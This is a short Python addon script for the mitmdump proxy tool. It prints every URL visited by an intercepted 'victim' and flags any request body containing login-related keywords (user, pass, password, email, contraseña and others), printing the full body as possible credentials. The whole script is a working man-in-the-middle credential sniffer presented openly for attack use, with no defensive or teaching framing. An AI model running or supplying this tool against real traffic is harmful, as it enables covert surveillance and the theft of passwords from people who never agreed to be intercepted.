# This script its created to be used by the tool "mitmdump" with the param "--script"

from urllib.parse import urlparse
from mitmproxy import http
from mitmproxy import ctx


def has_keywords(keywords, data):
    return any(keyword in data for keyword in keywords)

def request(packet):
    url = packet.request.url
    parsed_url = urlparse(url)
    print(f"[!>] URL visited by the victim: {parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}");

    keywords = ["login", "user", "uname", "username", "usuario", "pass", "pwd", "passwd", "password", "contraseña", "mail", "email", "correo"]
    data = packet.request.get_text()

    if has_keywords(keywords, data):
        print(f"\n\t[*>] Possible credentials detected: {data}\n")


